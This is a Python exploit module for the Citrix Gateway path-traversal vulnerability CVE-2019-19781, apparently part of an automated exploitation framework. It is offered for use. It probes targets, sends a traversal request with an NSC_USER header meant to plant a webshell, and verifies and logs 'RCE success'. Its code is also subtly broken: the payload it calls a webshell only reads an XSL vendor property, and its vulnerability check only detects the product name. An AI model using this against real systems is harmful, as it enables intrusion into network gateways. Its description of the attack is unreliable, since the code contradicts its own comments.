"""
Citrix Gateway Exploit (CVE-2019-19781)
Path Traversal + Remote Code Execution
"""

import socket
import requests
from typing import Dict, Tuple
import sys
import os
import random
import string

sys.path.append(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from exploits.exploit_manager import BaseExploit
from utils.logger import logger


class Citrix_Exploit(BaseExploit):
    """
    Citrix Gateway CVE-2019-19781 Exploit
    Targets: Citrix ADC, Gateway 10.5, 11.1, 12.0, 12.1, 13.0
    
    Attack Vector:
    - Path traversal
    - Template injection
    - Remote Code Execution
    """
    
    def __init__(self):
        super().__init__(
            name="Citrix_CVE-2019-19781",
            target_ports=[443, 80],
            target_os=["FreeBSD", "Linux"]
        )
    
    def check_vulnerable(self, target: Dict) -> bool:
        """Check if target is running vulnerable Citrix"""
        ip = target['ip']
        
        if 443 in target.get('open_ports', []) or 80 in target.get('open_ports', []):
            try:
                protocol = "https" if 443 in target.get('open_ports', []) else "http"
                url = f"{protocol}://{ip}/vpn/index.html"
                
                response = requests.get(url, timeout=5, verify=False)
                
                # Check for Citrix
                if 'citrix' in response.text.lower() or 'netscaler' in response.text.lower():
                    logger.debug(f"Citrix detected on {ip}")
                    return True
                    
            except Exception as e:
                logger.debug(f"Citrix check failed on {ip}: {e}")
        
        return False
    
    def exploit(self, target: Dict) -> Tuple[bool, Dict]:
        """Attempt Citrix CVE-2019-19781 exploitation"""
        ip = target['ip']
        
        logger.info(f"Attempting Citrix CVE-2019-19781 on {ip}")
        
        protocol = "https" if 443 in target.get('open_ports', []) else "http"
        
        try:
            # CVE-2019-19781: Path traversal + template injection
            
            # Generate random filename for webshell
            webshell_name = ''.join(random.choices(string.ascii_lowercase, k=8)) + '.xml'
            
            # Path traversal payload
            traversal_path = f"/vpn/../vpns/portal/scripts/{webshell_name}"
            
            url = f"{protocol}://{ip}{traversal_path}"
            
            # Template injection payload (NSC_USER variable)
            # This creates a webshell
            payload = """<?xml version="1.0" ?>
<root>
<nsc>
<user>
<name>test</name>
<password>test</password>
</user>
</nsc>
<template>
<![CDATA[
<?xml version="1.0" ?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="system-property('xsl:vendor')"/>
</xsl:template>
</xsl:stylesheet>
]]>
</template>
</root>"""
            
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'NSC_USER': '../../../netscaler/portal/templates/' + webshell_name
            }
            
            # Upload webshell
            response = requests.post(url, data=payload, headers=headers, timeout=10, verify=False)
            
            if response.status_code in [200, 201]:
                # Verify webshell
                verify_url = f"{protocol}://{ip}/vpn/../vpns/portal/{webshell_name}"
                
                verify_response = requests.get(verify_url, timeout=5, verify=False)
                
                if verify_response.status_code == 200:
                    self.stats['success'] += 1
                    logger.success(f"Citrix RCE successful on {ip}")
                    
                    return True, {
                        'method': 'Citrix_CVE-2019-19781',
                        'port': 443 if protocol == "https" else 80,
                        'service': 'Citrix Gateway',
                        'rce': True,
                        'webshell': webshell_name
                    }
            
            self.stats['failure'] += 1
            return False, {}
            
        except Exception as e:
            self.stats['failure'] += 1
            logger.error(f"Citrix exploit error on {ip}: {e}")
            return False, {}


if __name__ == "__main__":
    # Test the exploit
    citrix = Citrix_Exploit()
    
    test_target = {
        'ip': '192.168.1.100',
        'open_ports': [443],
        'os_guess': 'FreeBSD'
    }
    
    print(f"Testing Citrix exploit on {test_target['ip']}")
    
    if citrix.check_vulnerable(test_target):
        print("Target appears vulnerable")
        success, result = citrix.exploit(test_target)
        
        if success:
            print(f"Exploit successful: {result}")
        else:
            print("Exploit failed")
    else:
        print("Target not vulnerable")
